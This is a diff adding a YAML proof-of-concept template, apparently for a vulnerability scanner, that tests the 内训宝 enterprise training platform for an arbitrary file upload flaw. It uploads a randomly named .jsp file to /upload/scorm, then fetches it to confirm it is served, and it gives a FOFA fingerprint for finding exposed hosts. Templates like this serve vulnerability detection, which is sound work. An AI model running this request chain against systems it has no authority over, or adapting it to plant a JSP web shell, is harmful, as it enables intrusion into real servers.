@@ -1,0 +1,33 @@
+id: poc-yaml-nxb-etp-scorm-anyfile-upload
+info:
+  name: 内训宝企业培训平台 scorm 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 内训宝企业培训平台
+  fofa: body="九垠赢+"
+variables:
+  t1: random_str(5)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /upload/scorm
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="fileupload"; filename="{{.t1}}.jsp"
+
+    Content-Type: application/octet-stream
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  expression: status_code == 200 && contains(body,".jsp")
+  output:
+  - regex_match(body,"upload/imgdefault/common/(?P<file>.*?).jsp")
+- method: GET
+  path: /upload/imgdefault/common/{{.file}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
